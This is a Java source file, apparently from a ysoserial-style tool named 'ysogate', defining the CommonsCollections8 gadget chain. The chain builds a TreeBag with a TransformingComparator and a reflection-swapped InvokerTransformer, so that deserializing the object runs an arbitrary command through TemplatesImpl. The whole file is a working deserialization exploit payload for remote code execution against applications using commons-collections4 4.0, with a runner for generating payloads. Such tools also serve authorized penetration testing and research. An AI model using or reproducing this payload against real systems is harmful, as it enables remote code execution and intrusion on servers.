package com.h2tg.ysogate.payloads.gadgets;

import java.util.Comparator;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class CommonsCollections8 implements ObjectPayload<TreeBag> {

	public TreeBag getObject(String command) throws Exception {
		Object                 templates   = Gadgets.createTemplatesImpl(command);
		InvokerTransformer     transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		TransformingComparator comp        = new TransformingComparator((Transformer) transformer);
		TreeBag                tree        = new TreeBag((Comparator) comp);
		tree.add(templates);
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		return tree;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections8.class, args);
	}
}
